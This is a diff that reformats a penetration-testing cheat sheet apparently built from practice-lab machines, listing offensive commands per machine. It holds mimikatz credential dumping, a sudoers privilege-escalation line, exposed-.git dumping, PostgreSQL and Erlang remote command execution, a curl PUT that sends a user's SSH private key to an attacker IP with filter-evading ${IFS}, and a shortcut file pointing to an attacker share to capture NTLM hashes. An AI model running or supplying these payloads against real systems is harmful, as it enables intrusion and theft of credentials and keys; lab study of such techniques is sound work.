@@ -65,90 +65,109 @@
 		lsadump::sam
 		sekurlsa::logonpasswords
 
-		
-# ref: Cobweb
-  # find writable folders
-  $ find / -type d -writable 2>/dev/null
+# Machines		
+_ref: Cobweb_
+```
+# find writable folders
+$ find / -type d -writable 2>/dev/null
 
-  # exclude nosuid mounted paths
-  mount | grep -v nosuid
+# exclude nosuid mounted paths
+mount | grep -v nosuid
+```
 
-# ref: sona
-  # find possible passwords
-  $ grep -iroE 'password[=>].{5,30}' *
+_ref: sona_
+```
+# find possible passwords
+$ grep -iroE 'password[=>].{5,30}' *
 
-  # find python module path
-  $ python3 -c 'import base64; print(base64.__file__)'
-  /usr/lib/python3.8/base64.py
+# find python module path
+$ python3 -c 'import base64; print(base64.__file__)'
+/usr/lib/python3.8/base64.py
+```
 
-# ref: Postfish
-  # find group readable files
-  $ groups
-  $ find / -type f -group $GROUP -readable 2>/dev/null
+_ref: Postfish_
+```
+# find group readable files
+$ groups
+$ find / -type f -group $GROUP -readable 2>/dev/null
+```
 
-# ref: Nukem
-  $ echo commander ALL=(ALL) ALL >> sudoers
+_ref: Nukem_
+```
+$ echo commander ALL=(ALL) ALL >> sudoers
+```
 
-# ref: Hunit
-  # only git user has permission to push arbitrary updates to the master branch of a local repository.
-  # https://superuser.com/questions/232373/how-to-tell-git-which-private-key-to-use
-  # remote operations (e.g, clone/push) must be done via git user's SSH private key, local git operations can be as usual.
+_ref: Hunit_
+```
+# only git user has permission to push arbitrary updates to the master branch of a local repository.
+# https://superuser.com/questions/232373/how-to-tell-git-which-private-key-to-use
+# remote operations (e.g, clone/push) must be done via git user's SSH private key, local git operations can be as usual.
 
-  kali$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git clone git@$IP:/git-server
-  kali$ git add -A
-  kali$ git show
-  kali$ git commit -m "gimme shell please"
-  kali$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git push origin master
+$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git clone git@$IP:/git-server
+$ git add -A
+$ git show
+$ git commit -m "gimme shell please"
+$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git push origin master
+```
 
-# ref: Splodge
-  # Check git repo
-  $ wget http://$IP/.git/index
-  $ file index 
-  index: Git index, version 2, 81 entries
+_ref: Splodge_
+```
+# Check git repo
+$ wget http://$IP/.git/index
+$ file index 
+index: Git index, version 2, 81 entries
 
-  # Download git repo ( https://github.com/internetwache/GitTools )
-  # https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html
-  $ ./gitdumper.sh http://$IP/.git/ repo
-  $ git status
-  $ git checkout -- .
-  $ git log
+# Download git repo ( https://github.com/internetwache/GitTools )
+# https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html
+$ ./gitdumper.sh http://$IP/.git/ repo
+$ git status
+$ git checkout -- .
+$ git log
 
-  # https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
-  postgres# CREATE TABLE cmd_exec(cmd_output text);
-  postgres# COPY cmd_exec FROM PROGRAM 'id';
-  postgres# SELECT * FROM cmd_exec;
+# https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
+postgres# CREATE TABLE cmd_exec(cmd_output text);
+postgres# COPY cmd_exec FROM PROGRAM 'id';
+postgres# SELECT * FROM cmd_exec;
+```
 
-# ref: Exfiltrated
-  # Exiftool RCE
-  # https://github.com/OneSecCyber/JPEG_RCE
+_ref: Exfiltrated_
+```
+# Exiftool RCE
+# https://github.com/OneSecCyber/JPEG_RCE
+```
 
-# ref: Clyde
-  # Erlang Port Mapper Daemon exploit (python)
-  # == OR == 
-  $ apt install erlang
-  $ erl -sname test
-  (test@kali)1> erlang:spawn('rabbit@clyde',os,cmd,["echo ...|base64 -d|bash"]).
+_ref: Clyde_
+```
+# Erlang Port Mapper Daemon exploit (python)
+# == OR == 
+$ apt install erlang
+$ erl -sname test
+(test@kali)1> erlang:spawn('rabbit@clyde',os,cmd,["echo ...|base64 -d|bash"]).
+```
 
-# ref: Develop
-  # PHP Magic Hashes and Type Juggling
-  # https://www.whitehatsec.com/blog/magic-hashes/
-  $ php -a
-  php > var_dump(md5('240610708'));
-  string(32) "0e462097431906509019562988736854"
-  php > var_dump(md5('240610708') == '0e987654321098765432109876543210');
-  bool(true)
+_ref: Develop_
+```
+# PHP Magic Hashes and Type Juggling
+# https://www.whitehatsec.com/blog/magic-hashes/
+$ php -a
+php > var_dump(md5('240610708'));
+string(32) "0e462097431906509019562988736854"
+php > var_dump(md5('240610708') == '0e987654321098765432109876543210');
+bool(true)
 
-  # Data exfiltration ( curl PUT request )
-  # Always test with known file locations (e.g; /etc/passwd )
-  $ curl${IFS}-T${IFS}/home/franz/.ssh/id_rsa${IFS}192.168.49.82
+# Data exfiltration ( curl PUT request )
+# Always test with known file locations (e.g; /etc/passwd )
+$ curl${IFS}-T${IFS}/home/franz/.ssh/id_rsa${IFS}192.168.49.82
+```
 
-# ref: Vault
-  # If you encounter a writable share, upload a shortcut link pointing to attacker's machine and run responder to catch NTLM hashes
-  $ cat <<EOF > @hax.url        
-  [InternetShortcut]
-  URL=anything
-  WorkingDirectory=anything
-  IconFile=\\192.168.49.236\%USERNAME%.icon
-  IconIndex=1
-  EOF
-
+_ref: Vault_
+```
+# If you encounter a writable share, upload a shortcut link pointing to attacker's machine and run responder to catch NTLM hashes
+$ cat <<EOF > @hax.url        
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.49.236\%USERNAME%.icon
+IconIndex=1
+EOF
+```
